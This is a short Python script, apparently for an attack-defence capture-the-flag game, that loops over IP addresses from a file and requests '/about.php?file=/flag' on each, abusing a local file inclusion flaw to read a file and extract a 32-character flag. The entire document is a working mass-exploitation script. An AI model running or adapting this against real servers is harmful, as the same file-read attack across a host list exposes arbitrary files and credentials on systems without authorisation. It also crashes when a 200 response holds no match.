import requests
import re

f = open('ip.txt','r')
for i in f.readlines():
    url = 'http://'+i.strip()+''
    path = '/about.php?file=/flag'
    palyoad = url + path
    r = requests.get(palyoad)
    result = re.search('[a-z0-9]{32}',r.text)
    if r.status_code==200:
        print(url,result.group())
    else:
        print(url,"There is no flag here")
f.close()